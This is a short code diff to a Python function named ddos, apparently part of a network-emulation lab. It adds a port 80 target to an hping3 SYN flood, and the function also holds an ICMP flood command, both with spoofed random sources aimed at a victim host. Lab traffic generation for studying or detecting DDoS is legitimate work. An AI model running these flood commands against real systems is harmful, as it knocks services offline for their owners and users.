@@ -17,7 +17,7 @@ def ddos(n_switch=2, k_hosts=2, type='icmp'):
     for host in hosts[1:-1]:
         if not str(k_hosts) in host.name:
             if type == 'syn':
-                host.cmd(f'hping3 -S --rand-source --flood -d 2048 {victim.IP()} &')
+                host.cmd(f'hping3 -S -p 80 --rand-source --flood -d 2048 {victim.IP()} &')
             else:
                 host.cmd(f'hping3 -1 --rand-source --flood -d 2048 {victim.IP()} &')
             print(f'{type.upper()} DoS attack started from {host.name}')
